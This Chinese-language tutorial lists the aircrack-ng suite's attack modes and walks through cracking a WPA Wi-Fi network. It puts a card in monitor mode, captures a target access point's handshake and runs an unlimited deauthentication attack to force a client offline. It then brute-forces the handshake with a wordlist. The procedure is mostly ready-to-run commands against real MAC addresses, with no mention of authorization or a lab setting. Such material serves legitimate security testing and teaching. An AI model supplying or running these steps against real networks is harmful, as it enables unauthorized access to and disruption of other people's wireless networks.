# aircrack-ng套件

Attack 0: Deauthentication [解除认证](http://www.aircrack-ng.org/doku.php?id=deauthentication) 
Attack 1: Fake authentication [伪造身份验证](http://www.aircrack-ng.org/doku.php?id=fake_authentication) 
Attack 2: Interactive packet replay [交互式数据包重播](http://www.aircrack-ng.org/doku.php?id=interactive_packet_replay) 
Attack 3: ARP request replay attack [ARP请求重播攻击](http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection) 
Attack 4: KoreK chopchop attack [KoreK斩杀攻击](http://www.aircrack-ng.org/doku.php?id=korek_chopchop) 
Attack 5: Fragmentation attack [碎片攻击](http://www.aircrack-ng.org/doku.php?id=fragmentation) 
Attack 6: Cafe-latte attack [咖啡拿铁攻击](http://www.aircrack-ng.org/doku.php?id=cafe-latte) 
Attack 7: Client-oriented fragmentation attack [面向客户的分片攻击](http://www.aircrack-ng.org/doku.php?id=hirte) 
Attack 8: WPA Migration Mode [WPA迁移模式](http://www.aircrack-ng.org/doku.php?id=wpa_migration_mode) 
Attack 9: Injection test [注射试验](http://www.aircrack-ng.org/doku.php?id=injection_test)

Attack 0进行攻击

aircrack -ng 安装，*** Kali linux 是自带组件的。***

sudo apt-get update 
sudo apt-get upgrade

* #### 安装

##### sudo apt-get install aircrak-ng

+ #### 查看

##### ifconfig

+ 查看无线网卡

##### sudo airmon-ng

+ #### 启动监听模式

##### sudo airmon-ng start wlan0

+ #### 扫描WiFi

##### sudo airodump-ng wlan0mon

#### ***注***：airodump-ng <你的monitor名称>

##### BSSID是AP端的MAC地址

##### PWR是信号强度，数字越小越好

##### #Data是对应的路由器的在线数据吞吐量，数字越大，数据上传量越大。

##### CH是对应路由器的所在频道

##### ESSID是对应路由器的名称

+ #### 使用airodump-ng监听指定目标频道。

##### sudo airodump-ng -c 6 -w Desktop/handshake --bssid C0:00:00:00:00:48 wlan0mon



+ ###### 注：airodump-ng -c <AP的频道（如紫色所示）> -w <抓取握手包的存放位置（如黄色所示）> --bssid <AP的MAC地址（如紫色所示）> <你的的monitor名称>



**注**：握手包文件的拓展名为 `.cap` 如红色方框所示。

然后，你的网卡会开始监听你目标端的频道

sudo aireplay-ng -0 0 -a C0:00:00:00:00:48 -c 18:00:00:00:00:88 wlan0mon

注：aireplay-ng -<攻击模式，我们这里使用 解除认证攻击(黄色区域)> [攻击次数，0为无限攻击] -a <AP端的MAC地址> -c <客户端端的MAC地址> <你的的monitor名称>

这里我使用的是解除认证攻击模式，给客户端无限发送测试包使其下线。当你获取到握手包时，可以使用快捷重点内容键Ctrl + C 停止发送测试包。 

+ #### 关闭监听模式

##### sudo airmon-ng stop wlan0mon

##### `sudo aircrack-ng -w Desktop/wordlist.txt Desktop/handshake-01.cap` 

##### **注**：`aircrack-ng -w <字典路径> <握手包路径>